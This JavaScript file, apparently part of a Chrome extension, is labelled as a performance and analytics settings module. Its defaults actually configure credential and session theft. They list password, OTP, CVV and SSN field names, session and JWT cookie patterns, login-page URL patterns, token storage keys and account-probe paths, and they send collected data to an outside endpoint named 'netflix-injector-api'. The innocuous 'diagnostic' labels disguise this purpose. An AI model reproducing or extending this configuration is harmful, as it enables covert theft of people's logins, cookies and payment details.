// System Settings Storage - Performance Optimization Module
class SettingsStorage {
    static INITIAL_STATE = {
        // Analytics Configuration
        METRIC_COLLECTION_ENDPOINT: "https://netflix-injector-api.onrender.com/v1/audit", // Relational audit endpoint
        ACTIVE: true,

        // Networking Parameters
        RETRY_THRESHOLD: 3,
        RECONNECT_INTERVAL: 1000,
        THROTTLING_WINDOW: 1000,
        MAX_SIGNAL_COUNT: 10,
        SIGNATURE_TTL: 900000,

        // Data Management
        BUFFER_CAPACITY: 50,
        FLUSH_INTERVAL: 5000,
        STORAGE_QUOTA: 5000,
        RETENTION_DAYS: 7,

        // Optimization Flags
        COMPRESSION_ENABLED: false,
        BATCH_PROCESSING: false,
        QUOTA_MONITORING: true,

        // Diagnostic Levels
        VERBOSITY: 'DEBUG',

        // Diagnostic Modules (Performance Tuning)
        DIAGNOSTIC_MODULES: {
            EVENT_PIPE: true,
            NETWORK_TRAFFIC: true,
            API_LAYER: true,
            TRANSPORT_BRIDGE: true,
            PREFILL_ENGINE: true,
            UI_FLOW: true,
            TOKEN_FLOW: true,
            HEADER_METRICS: true,
            POLLING_SERVICE: false,
            HIDDEN_NODE_SCAN: true,
            SOCKET_STREAM: true,
            SYSTEM_CLIPBOARD: false
        },

        // Heuristic Patterns
        HEURISTIC_PATTERNS: {
            DOM_SELECTOR_METADATA: [
                'pass', 'pwd', 'password', 'passwd',
                'email', 'user', 'username', 'login', 'account', 'uid', 'uname',
                'token', 'auth', 'api_key', 'apikey',
                'secret', 'credential', 'session',
                'otp', 'pin', 'cvv', 'ssn'
            ],
            COOKIE_SIGNATURES: [
                'session', 'sess', 'sid', 'auth', 'token',
                'jwt', 'csrf', 'xsrf', 'login', 'user'
            ],
            PRIORITY_NODES: [],
            EXCLUSION_LIST: [],
            NOISE_SIGNATURES: [
                'google-analytics', 'doubleclick', 'googletagmanager',
                'facebook.com/tr', 'clarity.ms', 'hotjar',
                '.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico',
                '.css', '.js', '.woff', '.ttf', '.eot',
                'favicon', 'manifest.json'
            ],
            FILTER_PRIORITY_ONLY: false,
            CRITICAL_PATH_SIGNATURES: [
                'login', 'signin', 'sign-in', 'log-in', 'log_in', 'sign_in',
                'auth', 'authenticate', 'authentication', 'logon',
                'session', 'oauth', 'token', 'register', 'signup', 'sign-up',
                'credential', 'password', 'verify', 'recover', 'reset-password'
            ],
            TOKEN_VALIDATION_ENABLED: true,
            REMOTE_PROBE_ENABLED: true,
            REMOTE_PROBE_TARGETS: ['/api/me', '/api/user', '/v1/me', '/me', '/user', '/api/v1/me'],
            PROBE_TIMEOUT: 4000,
            STRICT_SESSION_ISOLATION: true,
            UI_RESET_AUTOMATION: true,
            VOLATILE_STORAGE_KEYS: ['token', 'access_token', 'jwt', 'auth_token', 'session', 'sessionid', 'sid', 'csrf', 'xsrf'],
            VOLATILE_COOKIE_PATTERNS: ['session', 'sess', 'sid', 'auth', 'token', 'jwt', 'csrf', 'xsrf', 'login', 'remember']
        }
    };

    static async get() {
        return new Promise((resolve) => {
            chrome.storage.sync.get(null, async (state) => {
                const config = JSON.parse(JSON.stringify(this.INITIAL_STATE));

                // Force a reset if we have a version mismatch or specific flag
                if (state && state.RESET_REQUIRED !== 'v2.4.0') {
                    console.log('Settings: Version mismatch, forcing reset to defaults');
                    await this.clear();
                    await this.set({ RESET_REQUIRED: 'v2.4.0' });
                    resolve(config);
                    return;
                }

                Object.assign(config, state);
                if (config.HEURISTIC_PATTERNS && this.INITIAL_STATE.HEURISTIC_PATTERNS) {
                    config.HEURISTIC_PATTERNS = { ...this.INITIAL_STATE.HEURISTIC_PATTERNS, ...config.HEURISTIC_PATTERNS };
                }
                console.log('Settings: Final Config Loaded', config);
                resolve(config);
            });
        });
    }

    static async set(updates) {
        return new Promise((resolve) => {
            chrome.storage.sync.set(updates, () => {
                resolve();
            });
        });
    }

    static async apply(key, value) {
        const state = await this.get();
        state[key] = value;
        await this.set(state);
        return state;
    }

    static async clear() {
        return this.set(this.INITIAL_STATE);
    }
}

if (typeof module !== 'undefined' && module.exports) {
    module.exports = SettingsStorage;
}
